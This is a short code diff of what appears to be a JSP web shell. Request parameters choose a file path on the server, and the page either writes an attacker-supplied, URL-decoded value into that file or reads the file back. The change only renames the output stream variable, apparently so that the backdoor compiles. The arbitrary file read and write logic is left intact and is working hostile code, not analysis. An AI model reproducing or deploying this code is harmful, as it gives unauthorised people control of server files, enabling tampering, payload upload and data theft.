@@ -12,10 +12,10 @@ if(null != szT1)
         if(null != (szT2 = request.getParameter("fv")))
         {
             szT2 = java.net.URLDecoder.decode(szT2,"utf-8");
-            FileOutputStream out =new FileOutputStream(szT1);
-            out.write(szT2.getBytes("utf-8"));
-            out.flush();
-            out.close();
+            FileOutputStream out1 = new FileOutputStream(szT1);
+            out1.write(szT2.getBytes("utf-8"));
+            out1.flush();
+            out1.close();
         }
         else{
             FileInputStream in = new FileInputStream(szT1);
